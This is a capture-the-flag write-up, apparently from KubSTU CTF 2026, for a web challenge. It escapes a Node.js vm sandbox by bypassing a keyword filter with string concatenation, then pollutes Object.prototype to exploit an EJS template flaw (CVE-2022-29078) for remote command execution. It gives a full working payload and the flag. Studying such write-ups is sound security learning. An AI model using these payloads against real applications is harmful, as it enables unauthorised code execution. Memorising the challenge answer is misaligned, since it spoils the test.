# Velox

> **Category:** Web · **Event:** KubSTU CTF 2026 Autumn · **Difficulty:** Medium · **Flag format:** `kubstu{...}`

## 📌 Task

The KubSTU team, after its fifth cup of raf at a meetup, decided that cobbling CTF challenges together on their knee is cringe, and spun up a **startup**. It's called "Velox" — "a cloud platform for transforming data through user JavaScript". Investors from SberProducts are already thrilled, T-Bank has made an offer, and Yandex is trying to buy it for shawarma and a yearly Plus subscription.

The service works. The landing page is pretty. There is registration. There is a dashboard. There is file upload. You can change your profile. Everything is legit, everything is in prod, everything is "secure" — Mikhalych said so himself, and Mikhalych has been in SecOps for three years, he knows.

Somewhere inside, the organizers' flag is hidden. The capybaras from the server room claim the sandbox is "solid" and "you won't find anything, go have a coffee". The capybaras, admittedly, also said that "`npm install` will build any moment now" — and here we are.

Find the flag. Don't ask where it is. If we knew — we wouldn't have made the challenge.

**Link:** `<will be issued>`

---

*P.S. The service is protected against bots. If your `python-requests` script caught a `403` — that's not a bug, it's a feature. Real hackers use a browser. Real capybaras use both.*

*P.P.S. The endpoint-fuzzing phase has been accounted for as well. Gosha is asleep, but the tarpit never sleeps.*

## 🏁 Solution

This is not a reference guide but a story of how I got to the flag: what I tried, what didn't work, what I thought at that moment and where I went next.

---

### Step 0. Opening the site

I'm given a link to `http://target:3000/`. I open it — the "Velox" landing page, "a cloud platform for transforming data through user JavaScript". Buttons: log in, register.

The first thought is simple: **since the service executes user JS on the server — this is a sandbox escape**. The whole task most likely comes down to breaking out of this "sandbox" and reading something on the file system. I don't yet know what and how — I go and look.

I register. Here's the first surprise: the form won't submit until you solve a Proof-of-Work (hashcash) and pass some "browser check". I take a real browser, enable JS — it passes. With `curl`/a script this would have stumbled, but I'm a human, I don't care. I log in with the account.

---

### Step 1. Looking around the dashboard

Inside there are three tabs:

- **Transforms** — create and run a JS transform.
- **Data Sources** — file upload.
- **Settings** — profile, email, password.

I immediately try to understand where the vulnerability lives. Logic suggests: the only place where **my code runs on the server** is Transforms. The rest (uploads, profile) is most likely decoration to distract. But I don't throw them away, I set them aside for later — if the main path hits a dead end, I'll come back and check them.

I create a transform → an editor opens with two fields: `input_json` (input data) and `code` (the actual JS). Submission goes to `POST /transforms/{id}/run`, the result is shown in the "Output" block.

---

### Step 2. Probing the sandbox

First the trivial: I write `1+1` → I get `2`. It works.

Now I need to understand **what I have inside**. I write:

```js
Object.keys(this).join(',')
```

I get:
```
input,Math,parseInt,parseFloat,isNaN,isFinite,undefined,NaN,Infinity,encodeURIComponent,decodeURIComponent
```

And here is the key moment. I expected to see `Object`, `String`, `Array`, `JSON` — the standard globals. **They are not there.** The authors deliberately wiped out everything except `input` (my data) and a couple of math utilities.

What does this tell me? They know the sandbox is weak and are trying to make life harder. So I can't just write the classic path `process.mainModule.require(...)` — there is no `process`, no `require`. I first need to **reach the host objects**.

---

### Step 3. Running into a keyword filter

I try:

```js
typeof process
```

I get: `Expression contains restricted syntax`.

Aha, a **filter**. I check what else is forbidden: `require`, `constructor`, `prototype`, `Function`, `eval`, `global`, `globalThis`, `mainModule`, `execSync`, `spawnSync`, `exec`, `spawn`, `__proto__` — everything is blocked. Unicode and hex escapes too.

I conclude: the filter is a **regex over the source code**, looking for whole words (`\b...\b`) plus `__proto__`. This is important, because the regex looks at the **text**, not at how JS will evaluate it. If I can assemble a forbidden word **from pieces at runtime** — the regex won't see it.

---

### Step 4. Bypassing the filter with concatenation

I try to assemble `constructor` from two strings:

```js
var a="con"; var b="structor";
input[a+b]
```

Not blocked. And it returns `Object` to me — because `input` is an object, and it has a prototype chain: `input.constructor` → the host `Object`.

**This is the first real breakthrough.** Through `input.constructor` I reach the host objects, despite the fact that `Object` is not in the globals and the word `constructor` is blocked. Concatenation fooled the regex, and the prototype chain fooled the absence of globals.

From here the logical next step: `input.constructor.constructor` — that's already the host `Function`. And `Function("return process")()` is the classic way to get `process` from anywhere in JS.

---

### Step 5. Getting process — and hitting an empty FLAG

I assemble:

```js
var a="con"; var b="structor";
var F = parseInt[a+b];              // parseInt.constructor → Function
var p = F("return pro"+"cess")();   // Function("return process")() → process
p.env.FLAG
```

An empty string is returned.

At first I think — maybe the variable is named differently. I enumerate `env`, look at the keys — no. **The flag is not in the environment.** The authors wiped it out of there.

OK, so the flag is not in env. Then where? The logical conclusion: **somewhere on the file system**, and it has to be read. The standard CTF trick — a `/flag` file with `0400 root:root` permissions and a SUID helper that reads it. I check the hypothesis: I try to call `child_process.execSync('/usr/local/bin/readflag')` (also via concatenation, to bypass the filter).

---

### Step 6. Calling readflag — and hitting the output sanitizer

I write:

```js
var a="con"; var b="structor";
var F = parseInt[a+b];
var p = F("return pro"+"cess")();
p["main"+"Module"]["re"+"quire"]("child_"+"pro"+"cess")["exe"+"cSy"+"nc"]("/usr/local/bin/readflag").toString()
```

And I get: `[output filtered — restricted content detected]`.

**A new surprise:** the authors hung a **sanitizer on the output**. It checks what my code returns and cuts out everything that looks like a flag — plain text, a reversed string, hex, charcode arrays. I even tried Caesar +1 — it cuts it. They check all 256 shifts.

Here I sit down and think. A direct return from the sandbox **does not work at all** — whatever I return, if it contains the flag, it gets cut. So I **need a side-channel** — a way to exfiltrate the flag somewhere past the Output block.

---

### Step 7. The key insight: the flag must land in the HTML, not in the Output

I know that the result is rendered through EJS (visible from the structure of the pages and from the fact that `ejs 3.1.6` sticks out in `package.json`/errors). And here **CVE-2022-29078** surfaces in my mind — an EJS vulnerability via `outputFunctionName`.

The essence of the CVE: when EJS compiles a template, it generates a string of the form

```js
var <outputFunctionName> = '';
```

and then accumulates the output into it. If an attacker can **pollute `Object.prototype.outputFunctionName`**, they substitute arbitrary JS there — and it executes at render time. And most importantly: the result lands **in the page HTML**, not in the Output block. And the sanitizer only checks the Output block. So the flag will pass through the render and end up in the page source.

This is the key turning point: I stop trying to **return** the flag from the sandbox and start **polluting the prototype**, so that the flag prints itself at the next render.

---

### Step 8. Building the payload

First I get the host's `Object.prototype` (via the same concatenation):

```js
var a="con"; var b="structor"; var c="pro"; var d="totype";
var proto = input[a+b][c+d];   // Object.prototype
```

Now I need to figure out **what string** to put into `outputFunctionName` so that EJS "inserts" it correctly and my code also executes. EJS substitutes the value as the function name:

```js
var <МОЯ_СТРОКА> = '';
```

So I need to close this declaration (`_tmp;`), execute my code, append the result into `__output` (EJS's accumulation variable), and open a new valid declaration (`var _tmp2`) so the syntax doesn't break.

I assemble:

```js
proto.outputFunctionName =
  '_tmp;try{__output+='
  + 'process' + '.'
  + 'mainModule' + '.'
  + 'require' + "('" + 'child_process' + "')['"
  + 'execSync' + "']('" + '/usr/local/bin/readflag' + "').toString()}"
  + 'catch(e){};var _tmp2';
```

(all the dangerous words are assembled by concatenation, to bypass the regex filter.)

I return an empty string `""` from the sandbox, so the sanitizer is satisfied.

---

### Step 9. Running it and looking at View Source

I paste the payload into the "Code" field, put `{}` into `input_json`, hit Run.

The Output block is empty (as intended). **But I open the page's View Source** — and there, in the HTML, lies the flag:

```
kubstu{vm_1s_n0t_a_s4ndb0x_pr0t0typ3_p0llut10n_2_rce}
```

Done.

---

### How I reasoned along the way — briefly

1. **"User JS on the server"** → so the goal is a sandbox escape.
2. **Wiped globals** → the authors know about the sandbox's weakness, I'll have to go through the prototype chain.
3. **A regex keyword filter** → I bypass it with string concatenation at runtime.
4. **`input.constructor` gives the host `Object`** → the first real breakthrough, I reach the host.
5. **`process.env.FLAG` is empty** → the flag is not in the environment, so it's in a file.
6. **`readflag` is cut by the sanitizer** → a direct return doesn't work, I need a side-channel.
7. **EJS 3.1.6 + CVE-2022-29078** → I pollute `Object.prototype.outputFunctionName`, the flag goes into the HTML past the sanitizer.
8. **View Source** → the flag.

---

### Full payload

```js
var a="con";var b="structor";var c="pro";var d="totype";var proto=input[a+b][c+d];var p=c+"cess";var m="mainM"+"odule";var r="re"+"quire";var ch="child_"+c+"cess";var es="exe"+"cSy"+"nc";var cmd="/usr/local/bin/readflag";proto.outputFunctionName="_tmp;try{__output+="+p+"."+m+"."+r+"('"+ch+"')['"+es+"']('"+cmd+"').toString()}catch(e){};var _tmp2";""
```

Paste into the "Code" field, put `{}` into `input_json`, hit Run, open the page source.

---

### The chain in one line

```
конкатенация строк (обход regex) → vm sandbox escape через input.constructor
  → Object.prototype pollution → EJS outputFunctionName (CVE-2022-29078)
  → RCE при рендере → /usr/local/bin/readflag (SUID) → флаг в HTML
```

### False trails I didn't fall for

- **Data Sources / file upload** — I checked, it's protected: a random file name, a MIME whitelist, no path traversal. Decoration.
- **Settings / profile change** — CSRF, bcrypt, no XSS. Decoration.
- **`process.env.FLAG`** — empty, env wiped.
- **A direct return of the flag from the sandbox** — cut by the sanitizer in all encodings.
- **Unicode/hex escapes** — blocked by the filter.

The authors put all this to lead you astray. The real path is just one.

**Flag:** `kubstu{vm_1s_n0t_a_s4ndb0x_pr0t0typ3_p0llut10n_2_rce}`
